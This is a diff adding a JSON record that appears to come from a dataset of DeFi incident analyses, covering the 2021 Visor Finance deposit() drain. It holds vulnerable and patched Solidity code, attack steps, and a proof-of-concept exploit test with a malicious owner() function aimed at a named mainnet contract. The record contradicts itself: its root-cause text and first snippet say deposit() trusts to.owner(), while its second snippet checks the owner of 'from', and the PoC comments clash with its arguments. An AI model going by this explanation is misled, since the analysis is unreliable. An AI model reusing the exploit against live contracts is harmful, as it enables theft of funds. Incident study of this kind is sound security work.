@@ -1,0 +1,37 @@
+{
+ "id": "2021__2021-12-21_Visor_Finance_DepositUnprotected",
+ "source_file": "2021/2021-12-21_Visor_Finance_DepositUnprotected.md",
+ "title": "Visor Finance — deposit() Owner Impersonation Infinite Reward Drain Analysis",
+ "date": "2021-12-21",
+ "protocol": "Visor Finance",
+ "chain": "Ethereum",
+ "loss_raw": "~$8,200,000",
+ "loss_usd": 8200000.0,
+ "root_cause": "RewardsHypervisor.deposit() trusted the return value of the recipient's owner(), allowing an attacker contract to return an arbitrary address as owner and drain others' vVISR",
+ "attack_tx": "0x6927...f3f (block 13,849,007)",
+ "vulnerable_contract": "0xC9f27A50f82571C1C8423A42970613b8dBDA14ef (IRewardsHypervisor)",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "// ❌ RewardsHypervisor @ 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef\n// Trusts the return value of to.owner() without validation\nfunction deposit(\n    uint256 visrDeposit,\n    address from,\n    address to    // ❌ Attacker contract address\n) external returns (uint256 shares) {\n    require(visrDeposit > 0, \"deposits must be nonzero\");\n\n    // ❌ Calls owner() on `to` to determine the actual beneficiary\n    // Attacker contract can return an arbitrary address from owner()\n    address recipient = IVault(to).owner();  // Attacker-controlled\n\n    shares = ...; // Calculated based on visrDeposit\n\n    // Mint vVISR to recipient (attacker-specified address)\n    vvisr.mint(recipient, shares);\n\n    visr.transferFrom(from, address(this), visrDeposit);\n}",
+  "// ❌ Root Cause: RewardsHypervisor.deposit() trusts the recipient's owner() return value,\n//    allowing an attacker contract to return an arbitrary address as owner and drain others' vVISR\n    function deposit(\n        uint256 visrDeposit,\n        address payable from,\n        address to\n    ) external returns (uint256 shares) {\n        require(visrDeposit > 0, \"deposits must be nonzero\");\n        require(to != address(0) && to != address(this), \"to\");\n        require(from != address(0) && from != address(this), \"from\");\n\n        shares = visrDeposit;\n        if (vvisr.totalSupply() != 0) {\n          uint256 visrBalance = visr.balanceOf(address(this));  // ❌ Direct reference to current balance — manipulable\n          shares = shares.mul(vvisr.totalSupply()).div(visrBalance);\n        }\n\n        if(isContract(from)) {\n          require(IVisor(from).owner() == msg.sender); \n          IVisor(from).delegatedTransferERC20(address(visr), address(this), visrDeposit);\n        }\n        else {\n          visr.safeTransferFrom(from, address(this), visrDeposit);\n        }\n\n        vvisr.mint(to, shares);\n    }"
+ ],
+ "code_after": [
+  "// ✅ Remove external to.owner() call — use msg.sender or an explicit beneficiary\nfunction deposit(\n    uint256 visrDeposit,\n    address from,\n    address to\n) external returns (uint256 shares) {\n    require(visrDeposit > 0, \"deposits must be nonzero\");\n\n    // ✅ Use `to` directly as beneficiary (remove external owner() call)\n    // Or fix msg.sender as the beneficiary\n    require(to != address(0), \"RewardsHypervisor: zero recipient\");\n\n    shares = ...; // Calculated based on visrDeposit\n\n    // ✅ Mint directly to `to` (no external contract call)\n    vvisr.mint(to, shares);\n    visr.safeTransferFrom(from, address(this), visrDeposit);\n}",
+  "// ✅ Remove external contract owner() call\n// ✅ Only allow msg.sender or explicitly validated addresses as beneficiary\n\n// Fix 1: Fix msg.sender as beneficiary\nfunction deposit(uint256 visrDeposit) external returns (uint256 shares) {\n    require(visrDeposit > 0, \"deposits must be nonzero\");\n    shares = calculateShares(visrDeposit);\n    vvisr.mint(msg.sender, shares); // Mint directly to msg.sender\n    visr.safeTransferFrom(msg.sender, address(this), visrDeposit);\n}\n\n// Fix 2: Only allow approved vault addresses as `to`\nmapping(address => bool) public approvedVaults;\n\nfunction deposit(uint256 visrDeposit, address to) external returns (uint256 shares) {\n    require(approvedVaults[to] || to == msg.sender, \"not approved vault\");\n    // ...\n}"
+ ],
+ "steps": [
+  "Step 1: Deploy malicious contract",
+  "Step 2: Call RewardsHypervisor.deposit()",
+  "Step 3: deposit() internally calls maliciousContract.owner()",
+  "→ Returns attacker wallet address",
+  "→ Mints 1e26 vVISR to attacker wallet",
+  "Step 4: Drain VISR rewards using minted vVISR",
+  "vVISR.balanceOf(attacker) → Withdraw protocol VISR"
+ ],
+ "other_code": [
+  "┌──────────────────────────────────────────────────────────────┐\n│ Step 1: Deploy malicious contract                            │\n│ owner() function returns msg.sender (attacker wallet)        │\n└─────────────────────┬────────────────────────────────────────┘\n                      │\n┌─────────────────────▼────────────────────────────────────────┐\n│ Step 2: Call RewardsHypervisor.deposit()                     │\n│ @ 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef                │\n│ deposit(                                                      │\n│   100_000_000_000_000_000_000_000_000, // 1e26 VISR          │\n│   address(this),                       // from               │\n│   address(maliciousContract)           // to                 │\n│ )                                                          ",
+  "// testExploit() — Mainnet fork block 13,849,006\nfunction testExploit() public {\n    // Call deposit(): to = address(this) (malicious contract)\n    // IRewardsHypervisor @ 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef\n    irrewards.deposit(\n        100_000_000_000_000_000_000_000_000, // 1e26 VISR\n        address(this),                        // from (attacker)\n        msg.sender                            // to → owner() is called\n    );\n    // msg.sender.owner() returns attacker address → vVISR minted to attacker\n    emit log_named_uint(\"Attacker VISR Balance\", visr.balanceOf(msg.sender));\n}\n\n// Malicious contract's owner() — returns attacker address\nfunction owner() external returns (address) {\n    return (address(this)); // or attacker EOA address\n}\n\n// delegatedTransferERC20 — empty impl"
+ ]
+}
